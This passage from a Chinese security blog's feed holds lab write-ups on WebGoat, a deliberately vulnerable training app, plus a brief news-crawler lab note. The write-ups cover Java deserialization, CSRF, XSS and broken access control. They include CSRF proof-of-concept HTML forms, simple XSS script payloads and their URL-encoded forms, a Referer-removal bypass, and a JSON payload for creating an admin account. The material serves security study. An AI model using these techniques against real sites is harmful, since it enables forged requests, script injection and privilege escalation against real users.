FileOutputStream(&quot;C:/java/hello&quot;)</code></pre><p>也可以使用一个文件对象来创建一个输出流来写文件。我们首先得使用File()方法来创建一个文件对象：</p><pre><code>File f = new File(&quot;C:/java/hello&quot;); OutputStream fOut = new FileOutputStream(f);</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code>package test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInput;import java.io.ObjectInputStream;public class UnserializationTest &#123;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));        Object object = objectInputStream.readObject();        return object;    &#125;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        Person person = (Person) unserialize(&quot;ser.bin&quot;);        System.out.println(&quot;unserialize&quot;+person);    &#125;&#125;</code></pre><p>这里也可以提前创建个空person对象来接收反序列化后的person对象</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127151513258.png" alt="image-20231127151513258"></p><h1 id="Webgoat-反序列化"><a href="#Webgoat-反序列化" class="headerlink" title="Webgoat 反序列化"></a>Webgoat 反序列化</h1><p>这道题一直不成功，但还是审计一下：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163148626.png" alt="image-20231127163148626"></p><p>首先对传入的字符串进行解码，然后进行反序列化，用o接受反序列化之后的对象，最后判断是否为VulnerableTaskHolder的实例</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163335284.png" alt="image-20231127163335284"></p><p>最下面是判断执行时间是否在3到7秒</p><p>我们再看一看这个危险类：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163555555.png" alt="image-20231127163555555"></p><p>这里和例题一样，使用taskAction来rce</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163838608.png" alt="image-20231127163838608"></p><p>从自定义的序列化过程来看，对象必须是十分钟之内创建的，然后rce必须以ping或者sleep开头</p><p>payload应该是这样：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127165418906.png" alt="image-20231127165418906"></p><p>但是根据回显在时间判断出了点问题，后来想起来在之前做题的时候发现docker的时间和我的系统时间是对不上的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;给java反序列化上个引子，顺带把webgoat代码审计结束了&lt;/p&gt;
&lt;p&gt;本来要开始学链子了，但是网警和技侦要开始考试了，打算突击一下c</summary>
      
    
    
    
    
    <category term="java" scheme="https://taninluv.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>爬虫</title>
    <link href="https://taninluv.github.io/2023/11/26/%E7%88%AC%E8%99%AB/"/>
    <id>https://taninluv.github.io/2023/11/26/%E7%88%AC%E8%99%AB/</id>
    <published>2023-11-26T06:54:21.000Z</published>
    <updated>2023-11-26T07:35:41.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>这是大数据隐私保护课程的实验-自动化新闻采集，只是简单的实验和记录，不作深入研究</p><h1 id="反爬虫机制"><a href="#反爬虫机制" class="headerlink" title="反爬虫机制"></a>反爬虫机制</h1><ul><li>robots.txt</li><li>IP封锁和频率限制</li><li>验证码</li><li>User-Agent检测</li><li>动态内容生成</li><li>Honypot技术</li><li>反反爬虫技术</li></ul><h1 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h1><p>谷歌新闻提供的rss，也就是xml的数据非常方便于信息采集：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126151612390.png" alt="image-20231126151612390"></p><p>半结构化的数据，但是谷歌有被反爬的风险</p><h1 id="百度新闻"><a href="#百度新闻" class="headerlink" title="百度新闻"></a>百度新闻</h1><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126152110282.png" alt="image-20231126152110282"></p><p><a href="https://www.baidu.com/s?rtt=1&bsst=1&cl=2&tn=news&ie=utf-8&word=%E6%BB%91%E5%9D%A1">https://www.baidu.com/s?rtt=1&amp;bsst=1&amp;cl=2&amp;tn=news&amp;ie=utf-8&amp;word=%E6%BB%91%E5%9D%A1</a></p><p>这里我们关注一下url的传参：</p><ul><li><p>rtt</p></li><li><p>bsst</p></li><li><p>cl</p></li><li><p>tn</p></li><li><p>ie</p></li><li><p>word</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126153106262.png" alt="image-20231126153106262"></p></li></ul><p>找到返回的报文观察我们需要爬取的字段特征</p><h1 id="beautifulsoup"><a href="#beautifulsoup" class="headerlink" title="beautifulsoup"></a>beautifulsoup</h1><p>from bs4 import BeautifulSoup</p><p><a href="https://zhuanlan.zhihu.com/p/128484144">https://zhuanlan.zhihu.com/p/128484144</a></p><p>解析-筛选-</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h1&gt;&lt;p&gt;这是大数据隐私保护课程的实验-自动化新闻采集，只是简单的实验和记录，不作深入研究&lt;/p&gt;
&lt;h1 id=&quot;反爬虫机制&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
    <category term="爬虫" scheme="https://taninluv.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-CSRF</title>
    <link href="https://taninluv.github.io/2023/11/24/WebGoat-CSRF/"/>
    <id>https://taninluv.github.io/2023/11/24/WebGoat-CSRF/</id>
    <published>2023-11-24T09:21:39.000Z</published>
    <updated>2023-11-25T08:20:23.020Z</updated>
    
    <content type="html"><![CDATA[<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>这题模拟一个简单的csrf，从外源触发这个表单就可以得到flag：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619320.png" alt="image-20231125141114780"></p><p>抓包，然后使用插件制作一个payload，简单看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619321.png" alt="image-20231125141428817"></p><p>相当于创建了一个表单，然后让他生成相同内容的请求包，但是这个表单显然比较初级，可以加入一些自动触发的dom事件在打开链接时自动触发提交表单，这里主要做代码审计，故不多做演示</p><p>打开burp pro比较麻烦，这里直接复制源码的表单元素，然后放到wolf触发：</p><pre><code>&lt;form accept-charset=&quot;UNKNOWN&quot; id=&quot;basic-csrf-get&quot; method=&quot;POST&quot; name=&quot;form1&quot; target=&quot;_blank&quot; successcallback=&quot;&quot; action=&quot;/WebGoat/csrf/basic-get-flag&quot;&gt;        &lt;input name=&quot;csrf&quot; type=&quot;hidden&quot; value=&quot;false&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619323.png" alt="image-20231125142631045"></p><p>点击提交即可</p><p>进入源码审计：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619324.png" alt="image-20231125143654426"></p><p>这里我们先跳过第一个判断，因为从我们抓到的包来看，我们的referer包头不为null。</p><p>当refererArr[2]不等于host的时候，我们进入else块，此时我们能拿到flag，修改包试一试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619325.png" alt="image-20231125144000683"></p><p>把8080端口改为8081，发现返回了flag</p><p>再回到源码，我们看到当referer为null的时候也可以success：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619326.png" alt="image-20231125144323608"></p><p>进入这个控制块好像无论如何都会success：</p><p>删除referer：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619327.png" alt="image-20231125144525087"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619328.png" alt="image-20231125144506097"></p><p>此时csrf为true还是false或者其他值都无关紧要</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619329.png" alt="image-20231125144634807"></p><p>但是这里有个问题时既然要不同源，为何检查referer而不是origin，挺奇怪的</p><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>这里让代表当前登录的用户触发评论提交。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619330.png" alt="image-20231125145329540"></p><p>这里的解法和上题差不多，我们看看源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619331.png" alt="image-20231125150302262"></p><p>这里的逻辑和上题大差不差，这里看看这个<code>weakAntiCSRF</code>:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619332.png" alt="image-20231125150355356"></p><p>我们发现这个令牌是静态的</p><p>而且最后的评论：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619333.png" alt="image-20231125152348104"></p><p>依然是我发起的，显而易见这个静态的token标记了我的身份，这里简单搜索了一下csrf token：</p><p><a href="https://blog.csdn.net/yexudengzhidao/article/details/93527586">CSRF防御之token认证_csrf token-CSDN博客</a></p><blockquote><p>CSRF Token的防护策略分为三个步骤：</p><p>将CSRF Token输出到页面中</p><p>首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p>页面提交的请求携带这个Token</p><p>对于GET请求，Token将附在请求地址之后，这样URL 就变成 <a href="http://url/?csrftoken=tokenvalue%E3%80%82">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上：</p>  <input type="hidden" name="csrftoken" value="tokenvalue"/>1这样，就把Token以参数的形式加入请求了。<p>服务器验证Token是否正确<br>当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。<br>总结：<br>Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。</p></blockquote><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>这道题跟前面的有些区别，就是在提交表单时，name和value之间会自动填充一个 <code>=</code>，这道题要上传一段json数据，此时我们需要处理这个<code>=</code>，因为我们上传的数据全都在json中：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619334.png" alt="image-20231125155326738"></p><p>此时我们并不需要<code>=</code>，解决办法是把这个<code>=</code>放在无关紧要的数据中，比如这里的message：</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://172.20.10.3:8080/WebGoat/csrf/feedback/message&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;&amp;#123;&amp;quot;name&amp;quot;&amp;#58;&amp;quot;webgoat&amp;quot;&amp;#44;&amp;quot;email&amp;quot;&amp;#58;&amp;quot;webgoat&amp;#64;webgoat&amp;#46;org&amp;quot;&amp;#44;&amp;#13;&amp;#10;&amp;quot;subject&amp;quot;&amp;#58;&amp;quot;suggestions&amp;quot;&amp;#44;&amp;quot;message&amp;quot;&amp;#58;&amp;quot;&quot; value=&quot;WebGoat&amp;#32;is&amp;#32;the&amp;#32;best&amp;#33;&amp;#33;&amp;quot;&amp;#125;&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>让name&#x3D;<code>&#123;&quot;name&quot;:&quot;webgoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;, &quot;subject&quot;:&quot;suggestions&quot;,&quot;message&quot;:&quot;</code></p><p>value&#x3D;<code>WebGoat is the best!!&quot;</code></p><p>拼接后，name字段中末尾多出的<code>&quot;</code>和value中的闭合，就有了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619335.png" alt="image-20231125155921749"></p><p>实际上是<code>&#123;&quot;name&quot;:&quot;webgoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;, &quot;subject&quot;:&quot;suggestions&quot;,&quot;message&quot;:&quot;</code>&#x3D;<code>WebGoat is the best!!&quot;</code></p><p>除了构造上的区别，其他跟之前一样</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619336.png" alt="image-20231125160046102"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619337.png" alt="image-20231125160356976"></p><p>contenttype需要修改，host和referer不同</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619338.png" alt="image-20231125160536993"></p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p>这道题挺迷惑的，看了一下别人的解释：</p><p><a href="https://www.freebuf.com/column/221947.html">历史最全 WebGoat 8.0 通关攻略 - FreeBuf网络安全行业门户</a></p><blockquote><h4 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h4><p>这一题按照题目要求，注册个csrf-开头的用户，比如我的用户名为tntaxin，然后我再注册一个csrf-tntaxin,然后登录csrf-tntaxin访问这道题目，点击solved就过了，当然这题的真实目的是希望你构建一个csrf 恶意链接，然后访问这个链接就会自动登录csrf-tntaxin这个账户，这样受害者的访问记录你就都知道了。</p></blockquote><p>也就是说别人不知道登录了我们的账户，我们从历史记录里面可以盗取别人的访问记录</p><p>源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619339.png" alt="image-20231125161832665"></p><p>当一个以csrf-xxx为用户名的用户登录后，会给xxx用户标记为成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;3&quot;&gt;&lt;a href=&quot;#3&quot; class=&quot;headerlink&quot; title=&quot;3&quot;&gt;&lt;/a&gt;3&lt;/h1&gt;&lt;p&gt;这题模拟一个简单的csrf，从外源触发这个表单就可以得到flag：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuserc</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="CSRF" scheme="https://taninluv.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-XSS</title>
    <link href="https://taninluv.github.io/2023/11/24/WebGoat-XSS/"/>
    <id>https://taninluv.github.io/2023/11/24/WebGoat-XSS/</id>
    <published>2023-11-24T02:40:16.000Z</published>
    <updated>2023-11-25T06:12:20.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-7"><a href="#xss-7" class="headerlink" title="xss-7"></a>xss-7</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411125.png" alt="image-20231124110348679"></p><p>这里直接点击购买看一下有哪些数据可以回显，然后发现是card number，然后在card number这个输入框注入代码:</p><pre><code>&lt;scrpt&gt;alert(&#39;xxx&#39;)&lt;/scrpt&gt;or&lt;scrpt&gt;console.log(&#39;xxx&#39;)&lt;/scrpt&gt;</code></pre><p>源码部分：</p><p><a href="https://blog.csdn.net/zhuying123jl/article/details/120846994">Java Pattern compile(String)用法及代码示例_pattern.compile_yinger553的博客-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411126.png" alt="image-20231124143843279"></p><p>写了一个正则匹配</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411127.png" alt="image-20231124144119278"></p><p>这里我们可以看到field1也就是card number我们是可以控制的，并且只是简单的拼接没有经过过滤，而这里根据前后文来看他有一些html标签，说明前端会解析我们的字符串，我们必定是可以进行xss注入的</p><h1 id="Reflected-and-DOM-Based-XSS"><a href="#Reflected-and-DOM-Based-XSS" class="headerlink" title="Reflected and DOM-Based XSS"></a>Reflected and DOM-Based XSS</h1><blockquote><p>反射式和基于DOM的XSS 基于DOM的XSS是反射XSS的另一种形式。两者都是通过发送带有反映到浏览器的输入的链接来触发的。DOM和“传统”反射XSS之间的区别在于，使用DOM，负载永远不会到达服务器。它将只由客户端处理。 攻击者向受害者发送恶意URL 受害者点击链接 该链接可能加载恶意网页或他们使用的（已登录？）具有易受攻击的路由&#x2F;处理程序的网页 如果是恶意网页，它可能会使用自己的JavaScript使用易受攻击的路由&#x2F;处理程序攻击另一个页面&#x2F;url 易受攻击的页面在该页面&#x2F;站点上呈现负载并在用户上下文中执行攻击 攻击者的恶意脚本可能使用本地帐户的权限运行命令 受害者没有意识到袭击发生了… 恶意攻击者不使用＜script＞alert（“xss”）&lt;&#x2F;script＞</p></blockquote><p>结合第八页：</p><blockquote><p>您应该能够使用上一个示例执行脚本。不过，在这一点上，它将被视为“self-XSS”。 为什么？ 这是因为没有任何链接会触发XSS</p></blockquote><p>反射性xss和dom型的xss的区别可能在于，反射型只能在本地自己触发，无法通过url发送给其他人让别人触发，我们先往下看一看dom xss：</p><h1 id="XSS-10"><a href="#XSS-10" class="headerlink" title="XSS-10"></a>XSS-10</h1><p>寻找在生产期间保留在应用程序中的测试代码的路由：</p><p>元素中检索route，发现只有一个：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411128.png" alt="image-20231124150020482"></p><p>按照路径到源代码中审计一下这个js文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411130.png" alt="image-20231124150117809"></p><p>找到了这个测试路由的片段，继续跟进一下这个方法：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411131.png" alt="image-20231124150718492"></p><p>&#x3D;》</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411132.png" alt="image-20231124150854700"></p><p>这里大概意思是查找一个.lesson-content的DOM元素，然后把html内容改为“test”+param，这里param显然是可以构造xss的</p><p>ok，那怎么传入参数呢？我们回到最开始的路由文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411133.png" alt="image-20231124152028792"></p><blockquote><ul><li><code>&#39;lesson/:name&#39;</code>: 当访问 <code>lesson/</code> 后接一个动态的 <code>name</code> 参数时，将触发 <code>lessonRoute</code> 方法。</li><li><code>&#39;lesson/:name/:pageNum&#39;</code>: 当访问 <code>lesson/</code> 后接一个动态的 <code>name</code> 参数和 <code>pageNum</code> 参数时，将触发 <code>lessonPageRoute</code> 方法。</li><li><code>&#39;test/:param&#39;</code>: 当访问 <code>test/</code> 后接一个动态的 <code>param</code> 参数时，将触发 <code>testRoute</code> 方法。</li></ul><p>这些路由规则中使用了冒号 <code>:</code> 定义了动态的 URL 参数部分，例如 <code>:name</code>、<code>:pageNum</code>、<code>:param</code>。当访问这些对应的 URL 时，这些参数会被传递给对应的路由处理函数。</p></blockquote><p>我们如何访问到对应的url呢？</p><p>看一下题目：</p><blockquote><p>对于本例，您将希望在路由处理程序中查找一些“测试”代码（WebGoat使用主干作为其主要JavaScript库）。有时，测试代码会留在生产中（而且测试代码通常非常简单，缺乏安全性或任何质量控制！）。 你的目标是找到路线并加以利用。不过，首先… 基本路线是什么？例如，请查看本课的URL…它应该看起来像&#x2F;WebGoat&#x2F;start.mvc#classic&#x2F;CrosSiteScripting.lesson&#x2F;9。本例中的“基本路由”是：start.mvc#classic&#x2F;   之后CrossSiteScripting.lesson&#x2F;9是由JavaScript路由处理程序处理的参数。 那么，在生产过程中留在应用程序中的测试代码的路径是什么呢？要回答这个问题，您必须检查JavaScript源代码。</p></blockquote><p>我们看到，start.mvc#classic&#x2F;是一个基本路由,这里先补充一下GPT的解释：</p><blockquote><p>在这个URL中：</p><ul><li><code>start.mvc</code> 可能是一个处理页面路由的 MVC（Model-View-Controller）模式中的控制器或者路由。</li><li><code>classic/CrosSiteScripting.lesson/9</code> 是哈希部分，可能是传递给控制器或路由的参数。</li></ul><p>通常情况下，URL中的哈希部分（#classic&#x2F;CrosSiteScripting.lesson&#x2F;9）通常用于前端路由，这意味着这个URL可能由前端 JavaScript 根据路由规则进行处理。</p><p>在常见的前端框架中，哈希部分被用于单页应用程序（SPA）中的路由处理。它允许前端应用程序根据哈希部分来确定显示的内容，而不会重新加载整个页面。在这种情况下，路由可能被设置为解析哈希部分并根据不同的路由规则显示不同的内容或触发不同的操作。</p><p>在你提供的URL中，可能存在一个名为<code>start.mvc</code>的控制器或路由，它根据哈希部分（<code>#classic/CrosSiteScripting.lesson/9</code>）来确定要显示或执行的内容。具体的路由处理方式和逻辑取决于应用程序的实现和使用的前端框架。</p></blockquote><p>也就是说前端js也对url 进行了路由解析和处理，这可能也是为什么我们前端访问的结构和源码审计里面的结构有所差异了，那这里的测试路由应该就是start.mvc#test了。</p><p>我们访问一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411134.png" alt="image-20231124153354605"></p><p>页面似乎没有发生变化，但是我们应该可以传入参数了：</p><h2 id="（坑）"><a href="#（坑）" class="headerlink" title="（坑）"></a>（坑）</h2><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>&#x3D;&gt;</p><pre><code>%3Cscript%3Ealert(1)%3C/script%3E</code></pre><p>但是这里访问之后并没有反应，</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411135.png" alt="image-20231124154953590"></p><p>看起来我们的分析应该是没有问题的</p><p>后端也没什么好看，主要是这里好像和后端也没啥关系：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411136.png" alt="image-20231124155056841"></p><p>突然发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411137.png" alt="image-20231124155626026"></p><p>如果正常情况下：<img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411138.png" alt="image-20231124155731764"></p><p>看起来我们输入标签之后，它并没有进入危险函数，最后看了后面一题的源码后：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411139.png" alt="image-20231124162920056"></p><p>原来时cyberchef在url加密的时候没有编码 <code>/</code>导致的不成功，要把<img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411140.png" alt="image-20231124163059886"></p><p>编码所有特殊字符勾选上</p><h1 id="xss-11"><a href="#xss-11" class="headerlink" title="xss-11"></a>xss-11</h1><p>这里让我们触发webgoat.customjs.phoneHome（），然后在控制台拿到相应的代码并提交，上一题都做出来了这里也就随便搞了：</p><p>但是这里挺有意思的，发现<code>&lt;script&gt;</code>标签可以不用闭合</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411141.png" alt="image-20231124163249722"></p><p>挺奇怪的，找了半天没有找到依据。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-7&quot;&gt;&lt;a href=&quot;#xss-7&quot; class=&quot;headerlink&quot; title=&quot;xss-7&quot;&gt;&lt;/a&gt;xss-7&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Taninluv/PICLI</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="XSS" scheme="https://taninluv.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Broken Access Control</title>
    <link href="https://taninluv.github.io/2023/11/23/Broken-Access-Control/"/>
    <id>https://taninluv.github.io/2023/11/23/Broken-Access-Control/</id>
    <published>2023-11-23T07:33:49.000Z</published>
    <updated>2023-11-26T03:26:39.097Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDOR-2"><a href="#IDOR-2" class="headerlink" title="IDOR-2"></a>IDOR-2</h1><blockquote><p>许多访问控制问题容易受到经过身份验证但未经授权的用户的攻击。因此，让我们从合法身份验证开始。然后，我们将寻找绕过或滥用授权的方法。</p></blockquote><p>这里只是输入tom或者cat进行登录，进入下一题进行IDOR审查</p><h1 id="IDOR-3"><a href="#IDOR-3" class="headerlink" title="IDOR-3"></a>IDOR-3</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126523.png" alt="image-20231123154028096"></p><p>抓包看一看没有显示的属性</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126525.png" alt="image-20231123154145613"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126526.png" alt="image-20231123155050326"></p><p>我们发现他把不相关的信息一并返回了，实际 用的信息只有其中三个，而关于判定答案部分：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126527.png" alt="image-20231123155217458"></p><p>以<code>，</code>为分隔，检测答案是否为userid和role</p><h1 id="IDOR-4"><a href="#IDOR-4" class="headerlink" title="IDOR-4"></a>IDOR-4</h1><p>在另一个接口查看自己的profile</p><p>根据描述：</p><blockquote><p>就概要文件而言，我们正在使用的应用程序似乎遵循RESTful模式。许多应用程序都具有提升用户可以访问另一用户内容的角色。在这种情况下，just&#x2F;profile将不起作用，因为自己用户的会话&#x2F;身份验证数据不会告诉我们他们想要查看谁的配置文件。那么，您认为使用直接对象引用显式查看您自己的配置文件的可能模式是什么？</p></blockquote><p>这样的话想起之前我们得到了自己的userid，这里应该是通过userid确定我们需要查看的概要文件，这样的模式在实际情况中也很常见</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126528.png" alt="image-20231123160321880"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126529.png" alt="image-20231123160435656"></p><p>他这里对userid其实没有添加更多的验证和防护，很大程度上我们可以通过爆破或者猜测或者其他方法得到别人的userid就可以得到别人的profile信息</p><h1 id="IDOR-5"><a href="#IDOR-5" class="headerlink" title="IDOR-5"></a>IDOR-5</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126530.png" alt="image-20231123163038524"></p><p>这里访问别人的profile，爆破一下，跟之前说的一样，这里主要做代码审计，就不爆破了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126531.png" alt="image-20231123163321558"></p><p>这个板块的源码给我的感觉有一点刻意了，这里第二个if就该截断才对，可能是单纯为了让我们感受一下吧…</p><h1 id="Missing-Function-Level-Access-Control"><a href="#Missing-Function-Level-Access-Control" class="headerlink" title="Missing Function Level Access Control"></a>Missing Function Level Access Control</h1><p>缺少功能级别访问控制</p><blockquote><p>事实上，许多人（包括本课的作者）会将功能级别的访问控制和IDOR归入“访问控制”。为了OWASP，前10名和这些教训，我们将进行区分。大多数人的区别在于，IDOR更多的是一个“水平”或“横向”访问控制问题，而缺少功能级别的访问控制“暴露了功能”。尽管这里的IDOR课程演示了功能是如何公开的（至少对同一角色的另一个用户），但我们将研究功能公开的其他方式。</p></blockquote><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126532.png" alt="image-20231123163858625"></p><p>在这里找到两个隐藏的表单</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126534.png" alt="image-20231123165225364"></p><p>个人感觉不是很好找这种表单，尤其是在页面元素很多的时候，这道题大概猜测在Accout板块或者Messages板块。其实也看得眼花。。</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>根据题目，我们可以利用上提找到的信息，也就是两个接口，访问一下&#x2F;users：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126535.png" alt="image-20231123172002806"></p><p>返回500，有点夸张，看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126536.png" alt="image-20231123173705160"></p><p>看来要设置Content-Type,这里的GET请求方法的视图函数返回了所有user</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126537.png" alt="image-20231123172546905"></p><p>挺离谱的，好像意料之外又情理之中</p><p>看一下hint里的复杂思路：</p><p>If the request to view users, were a ‘service’ or ‘RESTful’ endpoint, what would be different about it?</p><p>You will want to add WEBGOAT_ADMIN for the user’s role. Yes, you’d have to guess&#x2F;fuzz this in a real-world setting.</p><p>OK, here it is. First, create an admin user … Change the method to POST, change the content-type to “application&#x2F;json”. And your payload should look something like: {“username”:”newUser2”,”password”:”newUser12”,”matchingPassword”:”newUser12”,”role”:”WEBGOAT_ADMIN”}</p><p>也就是用post新创建一个admin用户，但是需要post的数据又是需要猜测一下的，按照hint就是需要猜测或者fuzz一下。看看源码怎么回事：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126538.png" alt="image-20231123174112906"></p><ul><li><code>consumes = &quot;application/json&quot;</code>：表示这个方法处理的请求内容类型是JSON格式。</li><li><code>produces = 